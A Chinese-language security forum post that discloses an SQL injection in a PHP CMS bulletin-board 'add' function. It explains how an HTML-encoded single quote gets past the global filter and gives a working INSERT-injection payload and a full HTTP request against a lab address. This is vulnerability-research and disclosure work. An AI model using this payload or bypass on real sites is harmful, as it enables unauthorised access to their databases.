0x01前言
------

看到以前的版本爆了挺多洞的，想看看这个新版本还有没有漏洞给我捡一下，结果还真捡到，然后分享一下给大家。

0x02 payload复现
--------------

payload(单引号要htmlencode)：

```sql
','2021-08-21 17:17:29',21,1,1),('exp',(database()),'2021-08-21 17:17:29',21,1,1)#

```

数据包：

```php
POST /bbs/bbs.php?action=add HTTP/1.1
Host: 172.20.10.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 304
Origin: http://172.20.10.8
DNT: 1
Connection: keep-alive
Referer: http://172.20.10.8/bbs/bbs.php?S_id=1
Cookie: PHPSESSID=rkb7d7qf44jan12nbq3vjf07nb; Hm_lvt_b60316de6009d5654de7312f772162be=1629536828; Hm_lpvt_b60316de6009d5654de7312f772162be=1629536867; CmsCode=b4ia
Upgrade-Insecure-Requests: 1

B_title=aaa&B_sort=1&B_content=%3Cp%3E%26%2339%3B%2C%26%2339%3B2021-08-21+17%3A17%3A29%26%2339%3B%2C21%2C1%2C1%29%2C%28%26%2339%3Bexp%26%2339%3B%2C%28database%28%29%29%2C%26%2339%3B2021-08-21+17%3A17%3A29%26%2339%3B%2C21%2C1%2C1%29%23%3C%2Fp%3E&code=09a7r7WJR1biC4zstFVg8TZGumpKbxfBC4MObWBIzvfDWoDFaSAavw
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-32dbd956031984cca0899a628e955d3215f28281.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-32dbd956031984cca0899a628e955d3215f28281.png)

0x03分析
------

在/function/function.php文件中,通过inject\_check方法对post传参进行了全局的sql注入过滤  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-792772fb0d1660d6f7baf23f650db9eeecbb3c01.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-792772fb0d1660d6f7baf23f650db9eeecbb3c01.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-04c03b2a404444a3dfde471207fb2f1dee0d0dbd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-04c03b2a404444a3dfde471207fb2f1dee0d0dbd.png)  
而在9-25行中，又对传参进行了转义  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-105127a18829df21dc8b9df6971b9bd5cf5481b0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-105127a18829df21dc8b9df6971b9bd5cf5481b0.png)  
正常来说，这样已经是写死的了，无法造成sql注入  
但是回到漏洞文件/bbs/bbs.php中  
在add方法里  
B\_content传参被带进了removexss方法中  
然后赋值$B\_content  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-83635868faf09cf2202cfd39eb2b4581b2e52064.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-83635868faf09cf2202cfd39eb2b4581b2e52064.png)  
跟入removexss方法里  
这行代码的意思就是将htmlencode的字符给decode了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e65568b7ff057988e73d503bf258e1ce0fad02d3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e65568b7ff057988e73d503bf258e1ce0fad02d3.png)  
当我传入`&#39;`时，它传入的内容decode为单引号  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf56ae19f18074a78fe4db73021785472b50e468.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf56ae19f18074a78fe4db73021785472b50e468.png)  
所以，当我们输入一个`&#39;`时就可以进行sql注入  
而该注入是insert注入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5df7c5c283d184cab5c0dae113917881cf280579.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5df7c5c283d184cab5c0dae113917881cf280579.png)

```php
mysqli_query($conn, "insert into ".TABLE."bbs(B_title,B_content,B_time,B_mid,B_sort,B_sh) values('" . $B_title . "','" . $B_content . "','" . date('Y-m-d H:i:s') . "'," . $_SESSION["M_id"] . "," . $B_sort . "," . $B_sh . ")");
```

$B\_content是我们可控的，所以可以通过该sql语句直接构造出payload  
Payload(要对单引号进行htmlencode)：

```sql
','2021-08-21 17:17:29',21,1,1),('payload',(database()),'2021-08-21 17:17:29',21,1,1)#
```

我们最终去数据库中查询的语句是

```sql
insert into SL_bbs(B_title,B_content,B_time,B_mid,B_sort,B_sh) values('xxz','','2021-08-21 17:17:29',21,1,1),('payload',(database()),'2021-08-21 17:17:29',21,1,1)#','2021-08-21 17:17:29',21,1,1)
```